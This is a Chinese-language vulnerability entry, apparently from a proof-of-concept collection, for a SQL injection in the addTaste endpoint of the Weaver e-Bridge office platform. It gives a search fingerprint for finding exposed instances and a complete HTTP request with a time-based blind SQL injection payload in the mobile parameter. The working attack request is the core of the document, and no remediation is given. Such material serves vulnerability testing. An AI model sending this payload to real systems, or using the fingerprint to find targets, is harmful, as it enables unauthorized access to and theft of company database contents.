﻿# 泛微云桥 e-Bridge addTaste接口SQL注入漏洞

> 更新时间：2024-01-24

> 漏洞编号：

> 漏洞说明：e-Bridge 提供了一套全面的办公自动化工具，包括文档管理、流程管理、协同办公、知识管理、移动办公等功能。它的核心理念是将企业内部的各种业务流程数字化，并通过云端技术实现跨部门、跨地域的协同办公和信息共享。该系统 addTaste接口存在SQL注入漏洞，通过此漏洞攻击者可获取企业数据库敏感数据。

> 漏洞特征：app="泛微-云桥e-Bridge"

> 验证脚本：HTTP

```
GET/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
Accept: */*
Accept-Encoding: gzip
SL-CE-SUID: 25
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：泛微云桥 e-Bridge addTaste接口SQL注入漏洞.poc
